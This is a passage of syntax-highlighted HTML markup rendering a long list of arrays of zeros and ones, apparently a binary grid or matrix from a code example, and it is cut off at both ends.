punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token 